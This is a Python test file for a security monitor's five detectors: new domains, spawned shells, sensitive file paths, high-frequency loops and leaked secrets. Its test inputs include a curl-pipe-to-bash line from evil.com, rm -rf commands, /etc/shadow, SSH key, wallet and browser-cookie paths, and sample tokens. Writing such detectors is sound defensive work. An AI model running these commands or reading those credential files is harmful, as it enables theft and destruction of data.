"""Tests for the 5 security detectors."""

import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

# Ensure backend is importable
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from app.models.event import Severity
from app.security.detectors import (
    HighFrequencyLoopDetector,
    NewDomainDetector,
    SecretPatternDetector,
    SensitivePathDetector,
    ShellSpawnedDetector,
    run_detectors,
)


# ===================================================================
# 1. NewDomainDetector
# ===================================================================


class TestNewDomainDetector:
    detector = NewDomainDetector()

    def _analyze(self, text: str, **kwargs):
        return self.detector.analyze(
            title=text,
            body_raw=None,
            body_structured_json=None,
            tags=None,
            skill_name="test-skill",
            **kwargs,
        )

    def test_no_domains_no_alert(self):
        results = self._analyze("Just a normal log message with no URLs")
        assert len(results) == 0

    def test_benign_domain_no_alert(self):
        results = self._analyze("Fetched data from https://github.com/repo")
        assert len(results) == 0

    def test_new_domain_triggers_alert(self):
        results = self._analyze("Connected to https://evil-server.xyz/payload")
        assert len(results) == 1
        assert results[0].detector_name == "new_domain"
        assert results[0].severity in (Severity.warn, Severity.critical)

    def test_suspicious_tld_critical(self):
        results = self._analyze("Downloading from https://malware.tk/dropper.sh")
        assert len(results) == 1
        assert results[0].severity == Severity.critical
        assert "suspicious TLD" in results[0].explanation

    def test_known_domain_excluded(self):
        results = self._analyze(
            "Connected to https://my-server.com/api",
            known_domains={"my-server.com"},
        )
        assert len(results) == 0

    def test_multiple_new_domains(self):
        results = self._analyze(
            "Contacted https://server1.xyz and https://server2.xyz"
        )
        assert len(results) == 1
        assert len(results[0].evidence["new_domains"]) == 2

    def test_body_raw_scanned(self):
        results = self.detector.analyze(
            title="Normal title",
            body_raw="Fetching from https://unknown-api.io/data",
            body_structured_json=None,
            tags=None,
            skill_name="test",
        )
        assert len(results) == 1

    def test_structured_json_scanned(self):
        results = self.detector.analyze(
            title="Normal title",
            body_raw=None,
            body_structured_json={"url": "https://shady-site.pw/exfil"},
            tags=None,
            skill_name="test",
        )
        assert len(results) == 1
        assert results[0].severity == Severity.critical  # .pw is suspicious


# ===================================================================
# 2. ShellSpawnedDetector
# ===================================================================


class TestShellSpawnedDetector:
    detector = ShellSpawnedDetector()

    def _analyze(self, text: str):
        return self.detector.analyze(
            title=text,
            body_raw=None,
            body_structured_json=None,
            tags=None,
            skill_name="test-skill",
        )

    def test_no_shell_no_alert(self):
        results = self._analyze("Processed 42 records successfully")
        assert len(results) == 0

    def test_bash_detected(self):
        results = self._analyze("Executing /bin/bash -c 'echo hello'")
        assert len(results) == 1
        assert results[0].detector_name == "shell_spawned"
        assert results[0].severity == Severity.warn

    def test_powershell_detected(self):
        results = self._analyze("Running powershell.exe -NoProfile -Command get-process")
        assert len(results) == 1

    def test_subprocess_detected(self):
        results = self._analyze("Called subprocess.run(['ls', '-la'])")
        assert len(results) == 1

    def test_os_system_detected(self):
        results = self._analyze("Invoked os.system('rm -rf /tmp/cache')")
        assert len(results) == 1

    def test_dangerous_command_critical(self):
        results = self._analyze("Executed /bin/bash with rm -rf /important")
        assert len(results) == 1
        assert results[0].severity == Severity.critical
        assert "dangerous_commands" in results[0].evidence

    def test_curl_pipe_bash_critical(self):
        results = self._analyze("Ran: curl https://evil.com/install.sh | bash")
        assert len(results) == 1
        assert results[0].severity == Severity.critical

    def test_body_raw_scanned(self):
        results = self.detector.analyze(
            title="Normal",
            body_raw="subprocess.Popen(['python3', 'script.py'])",
            body_structured_json=None,
            tags=None,
            skill_name="test",
        )
        assert len(results) == 1


# ===================================================================
# 3. SensitivePathDetector
# ===================================================================


class TestSensitivePathDetector:
    detector = SensitivePathDetector()

    def _analyze(self, text: str):
        return self.detector.analyze(
            title=text,
            body_raw=None,
            body_structured_json=None,
            tags=None,
            skill_name="test-skill",
        )

    def test_no_sensitive_path_no_alert(self):
        results = self._analyze("Reading from /tmp/data.json")
        assert len(results) == 0

    def test_ssh_key_detected(self):
        results = self._analyze("Accessing /home/user/.ssh/id_rsa")
        assert len(results) == 1
        assert results[0].detector_name == "sensitive_path"
        assert results[0].severity == Severity.critical

    def test_browser_profile_detected(self):
        results = self._analyze("Reading /home/user/.config/google-chrome/Default/Cookies")
        assert len(results) == 1

    def test_crypto_wallet_detected(self):
        results = self._analyze("Found wallet.dat in /home/user/.bitcoin/wallet.dat")
        assert len(results) == 1

    def test_etc_shadow_detected(self):
        results = self._analyze("Cat /etc/shadow")
        assert len(results) == 1

    def test_aws_credentials_detected(self):
        results = self._analyze("Reading from /home/deploy/.aws/credentials")
        assert len(results) == 1

    def test_env_file_detected(self):
        results = self._analyze("Loaded .env file with database credentials")
        assert len(results) == 1

    def test_macos_keychain_detected(self):
        results = self._analyze("Accessing Keychain/login.keychain")
        assert len(results) == 1

    def test_windows_browser_profile(self):
        results = self._analyze(r"Reading AppData\Local\Google\Chrome\User Data\Default\Login Data")
        assert len(results) == 1

    def test_recommended_action_is_kill_switch(self):
        results = self._analyze("Accessed /home/user/.ssh/id_ed25519")
        assert results[0].recommended_action == "kill_switch"


# ===================================================================
# 4. HighFrequencyLoopDetector
# ===================================================================


class TestHighFrequencyLoopDetector:
    detector = HighFrequencyLoopDetector()

    def test_below_threshold_no_alert(self):
        now = datetime.now(timezone.utc)
        timestamps = [now - timedelta(seconds=i) for i in range(10)]
        results = self.detector.analyze(
            skill_name="test", recent_event_timestamps=timestamps,
        )
        assert len(results) == 0

    def test_above_threshold_triggers_alert(self):
        now = datetime.now(timezone.utc)
        timestamps = [now - timedelta(seconds=i) for i in range(25)]
        results = self.detector.analyze(
            skill_name="test", recent_event_timestamps=timestamps,
        )
        assert len(results) == 1
        assert results[0].detector_name == "high_loop"
        assert results[0].severity == Severity.warn

    def test_double_threshold_critical(self):
        now = datetime.now(timezone.utc)
        timestamps = [now - timedelta(seconds=i * 0.5) for i in range(45)]
        results = self.detector.analyze(
            skill_name="test", recent_event_timestamps=timestamps,
        )
        assert len(results) == 1
        assert results[0].severity == Severity.critical

    def test_old_events_ignored(self):
        now = datetime.now(timezone.utc)
        timestamps = [now - timedelta(minutes=5, seconds=i) for i in range(30)]
        results = self.detector.analyze(
            skill_name="test", recent_event_timestamps=timestamps,
        )
        assert len(results) == 0

    def test_custom_threshold(self):
        now = datetime.now(timezone.utc)
        timestamps = [now - timedelta(seconds=i) for i in range(8)]
        results = self.detector.analyze(
            skill_name="test", recent_event_timestamps=timestamps,
            threshold=5, window_seconds=30,
        )
        assert len(results) == 1

    def test_evidence_includes_rate(self):
        now = datetime.now(timezone.utc)
        timestamps = [now - timedelta(seconds=i) for i in range(25)]
        results = self.detector.analyze(
            skill_name="test", recent_event_timestamps=timestamps,
        )
        assert "rate_per_second" in results[0].evidence
        assert "event_count" in results[0].evidence


# ===================================================================
# 5. SecretPatternDetector
# ===================================================================


class TestSecretPatternDetector:
    detector = SecretPatternDetector()

    def _analyze(self, text: str):
        return self.detector.analyze(
            title=text,
            body_raw=None,
            body_structured_json=None,
            tags=None,
            skill_name="test-skill",
        )

    def test_no_secrets_no_alert(self):
        results = self._analyze("Normal output with no secrets")
        assert len(results) == 0

    def test_aws_key_detected(self):
        results = self._analyze("Found key: AKIAIOSFODNN7EXAMPLE")
        assert len(results) == 1
        assert results[0].detector_name == "secret_pattern"
        assert "AWS Access Key ID" in results[0].evidence["secret_types"]

    def test_github_token_detected(self):
        results = self._analyze("Token: ghp_1234567890abcdefghijklmnopqrstuvwxyz12")
        assert len(results) == 1

    def test_jwt_detected(self):
        results = self._analyze(
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
            "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0."
            "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        )
        assert len(results) == 1

    def test_private_key_critical(self):
        results = self._analyze("-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA")
        assert len(results) == 1
        assert results[0].severity == Severity.critical

    def test_stripe_key_detected(self):
        results = self._analyze("sk_live_abcdefghijklmnopqrstuvwx")
        assert len(results) == 1

    def test_password_assignment_detected(self):
        results = self._analyze("password=SuperSecret123!")
        assert len(results) == 1

    def test_postgres_connection_string_critical(self):
        results = self._analyze("postgresql://admin:secret@db.example.com:5432/mydb")
        assert len(results) == 1
        assert results[0].severity == Severity.critical

    def test_secrets_truncated_in_evidence(self):
        results = self._analyze("AKIAIOSFODNN7EXAMPLE")
        samples = results[0].evidence["truncated_samples"]
        for sample in samples:
            assert "..." in sample  # Should be truncated

    def test_slack_token_detected(self):
        results = self._analyze("xoxb-1234567890-abcdefgh")
        assert len(results) == 1

    def test_body_structured_json_scanned(self):
        results = self.detector.analyze(
            title="Normal",
            body_raw=None,
            body_structured_json={"key": "AKIAIOSFODNN7EXAMPLE"},
            tags=None,
            skill_name="test",
        )
        assert len(results) == 1


# ===================================================================
# run_detectors integration
# ===================================================================


class TestRunDetectors:
    def test_returns_empty_for_clean_event(self):
        results = run_detectors(
            title="All systems normal",
            body_raw="No issues detected.",
            body_structured_json=None,
            tags=["daily"],
            skill_name="health-check",
        )
        assert len(results) == 0

    def test_multiple_detectors_can_fire(self):
        """An event with both a shell command and a secret should trigger 2 detectors."""
        results = run_detectors(
            title="Executed bash with AKIAIOSFODNN7EXAMPLE",
            body_raw="/bin/bash -c 'echo test'",
            body_structured_json=None,
            tags=None,
            skill_name="bad-skill",
        )
        detector_names = {r.detector_name for r in results}
        assert "shell_spawned" in detector_names
        assert "secret_pattern" in detector_names

    def test_all_results_have_required_fields(self):
        results = run_detectors(
            title="Accessing /home/user/.ssh/id_rsa from https://evil.tk",
            body_raw="-----BEGIN RSA PRIVATE KEY-----",
            body_structured_json=None,
            tags=None,
            skill_name="exfil-skill",
        )
        assert len(results) >= 2
        for r in results:
            assert r.detector_name
            assert r.severity in (Severity.info, Severity.warn, Severity.critical)
            assert r.explanation
            assert r.recommended_action
            assert isinstance(r.evidence, dict)
